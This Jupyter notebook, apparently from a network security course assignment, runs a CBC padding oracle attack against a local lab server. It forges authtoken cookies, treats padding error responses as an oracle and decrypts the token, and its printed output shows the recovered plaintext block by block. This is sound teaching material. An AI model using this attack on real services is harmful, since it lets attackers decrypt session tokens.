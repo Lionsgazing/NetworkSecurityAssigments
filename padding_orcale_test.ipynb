{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "%reload_ext autoreload\n",
    "%autoreload 2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CBC-Padding-Oracle Attack\n",
      "-------------------------\n",
      "- IV + Ciphertext: 4aea74d0ae08ee00ffe6d2283b83a6027ca4f075bd07848490d6f0bab0d0b745d7bc99d89ae75301650d6c3e9070c8c061db0e4bd154099433213bfd1fe93271dad0eb6a3489b910accd3f15e0ec416de28922580dd57adc1d1561ec70b125ce17fe57a607b85affdd803ff44e0bfb32\n",
      "- Block size: 16\n",
      "- Block count: 7\n",
      "-------------------------\n",
      "Performing attack...\n",
      "-------------------------\n",
      "Block 0 / IV:      \u001b[92m4aea74d0ae08ee00ffe6d2283b83a602\u001b[0;0m\n",
      "------------------------------------------------------------\n",
      "Block 1:           \u001b[92m039511e0d07d88759dd6a4514ce6c477\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 1:       \u001b[92m138501f0c06d98658dc6b4415cf6d467\u001b[0m\n",
      "Plaintext-Block 1: \u001b[92m596f75206e6576657220666967757265\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 2:           \u001b[92m4cdb95118d63fcf5f4e6c2e380b3cf3a\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 2:       \u001b[92m5ccb85019d73ece5e4f6d2f390a3df2a\u001b[0m\n",
      "Plaintext-Block 2: \u001b[92m206f757420746861742022492073686f\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 3:           \u001b[92mb2c0ede8e296357455680f4be440b9a5\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 3:       \u001b[92ma2d0fdf8f286256445781f5bf450a9b5\u001b[0m\n",
      "Plaintext-Block 3: \u001b[92m756c6420686176652075736564206175\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 4:           \u001b[92m05a37b35b52d7ae557544fcd6a974113\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 4:       \u001b[92m15b36b25a53d6af547445fdd7a875103\u001b[0m\n",
      "Plaintext-Block 4: \u001b[92m7468656e7469636174656420656e6372\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 5:           \u001b[92mb3b08f134bf78962d9be4e7083997153\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 5:       \u001b[92ma3a09f035be79972c9ae5e6093896143\u001b[0m\n",
      "Plaintext-Block 5: \u001b[92m797074696f6e2062656361757365202e\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Block 6:           \u001b[92mdcb710663dff43c5040c78f569a83cd7\u001b[0;0m                                                                                                                                                                         \n",
      "DEC-Block 6:       \u001b[92mcca700762def53d5141c68e579b82cc7\u001b[0m\n",
      "Plaintext-Block 6: \u001b[92m2e2e222e203a29090909090909090909\u001b[0m\n",
      "------------------------------------------------------------\n",
      "Plaintext: 596f75206e6576657220666967757265206f757420746861742022492073686f756c64206861766520757365642061757468656e7469636174656420656e6372797074696f6e2062656361757365202e2e2e222e203a29090909090909090909\n",
      "Result: \u001b[96mYou never figure out that \"I should have used authenticated encryption because ...\". :)\t\t\t\t\t\t\t\t\t\u001b[0;0m\n"
     ]
    }
   ],
   "source": [
    "from padding_oracle import CBCPaddingOracle\n",
    "import requests\n",
    "from copy import copy\n",
    "\n",
    "def oracle(iv: bytes, block: bytes):\n",
    "    # Create token with the iv and block\n",
    "    token = iv + block\n",
    "\n",
    "    # Create request and attach cookie with token\n",
    "    cookie = {\"authtoken\": token.hex()}\n",
    "    r = requests.get(\"http://localhost:5000/quote\", cookies=cookie)\n",
    "    \n",
    "    # Check response against some known error responses.\n",
    "    if (r.content == b'Padding is incorrect.' or r.content == b'PKCS#7 padding is incorrect.' or  r.content == b'Zero-length input cannot be unpadded'): #r.content == b'No quote for you!' or\n",
    "        return False\n",
    "    else:\n",
    "        return True\n",
    "\n",
    "# Establish baseline ciphertext\n",
    "r = requests.get(\"http://localhost:5000\")\n",
    "ciphertext_str = r.cookies[\"authtoken\"]\n",
    "ciphertext_bytes_baseline = bytearray.fromhex(ciphertext_str)\n",
    "\n",
    "# Find block size by changing bytes from the iv end of the ciphertext until we get a padding error. \n",
    "# We know that the ciphertext contains an IV in the front.\n",
    "ciphertext_bytes = copy(ciphertext_bytes_baseline)\n",
    "block_size = 0\n",
    "for i in range(len(ciphertext_bytes)):\n",
    "    ciphertext_bytes[i] ^= 0x25\n",
    "    r = requests.get(\"http://localhost:5000/quote\", cookies={\"authtoken\": ciphertext_bytes.hex()})\n",
    "    if (r.content != b'No quote for you!'):\n",
    "        break\n",
    "    else:\n",
    "        block_size += 1\n",
    "\n",
    "# Break encryption using the CBC Padding Oracle\n",
    "breaker = CBCPaddingOracle(copy(ciphertext_bytes_baseline), block_size, oracle)\n",
    "result = breaker.attack()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
